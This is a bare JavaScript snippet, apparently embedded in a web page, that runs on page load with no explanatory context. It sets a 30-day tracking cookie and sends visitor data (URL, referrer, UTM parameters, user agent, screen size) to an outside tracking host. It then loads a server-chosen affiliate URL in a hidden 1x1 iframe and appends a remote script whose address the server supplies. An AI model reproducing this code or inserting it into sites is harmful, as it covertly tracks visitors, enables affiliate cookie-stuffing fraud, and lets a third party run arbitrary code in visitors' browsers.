
(async () => {
  


    const urlNew = new URL(window.location.href);
  const utm_source = urlNew.searchParams.get("utm_source") || "";
  const utm_campaign = urlNew.searchParams.get("utm_campaign") || "";
  const utm_medium = urlNew.searchParams.get("utm_medium") || "";
  const referrer = document.referrer;
  const screenResolution = `${window.screen.width}x${window.screen.height}`;
  const userAgent = navigator.userAgent;
  const timestamp = new Date().toISOString();

const payload = {
    utm_source,
    utm_campaign,
    utm_medium,
    referrer,
    screenResolution,
    userAgent,
    timestamp,
    page: window.location.href,
   
  };

  try {

    let uniqueId = getCookie('tracking_uuid_vpn') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid_vpn=' + uniqueId + '; expires=' + expires + ';path=/;';
   
    const response = await fetch('https://www.tracktraffics.com/api/track-user-withoutUniDatavpn', {
      method: "POST",
      mode: "cors",
      body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                    payload,
                }),
      headers: {
        "Content-Type": "application/json"
      }
    })
     let result = await response.json();
            


    if (result.affiliate_url) {
      const iframe = document.createElement("iframe");
      iframe.src = result.affiliate_url;
      iframe.sandbox = "allow-same-origin allow-scripts";
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      iframe.style.border = "0";
      iframe.style.display = "none";
      document.body?.appendChild(iframe);
    }


    if (result.faffiliate_url) {
      const script = document.createElement("script");
      script.src = result.faffiliate_url;
      script.async = true;
      (document.head || document.body).appendChild(script);
    }
  } catch (error) {
    console.error("Error loading affiliate script:", error);
  }
})();
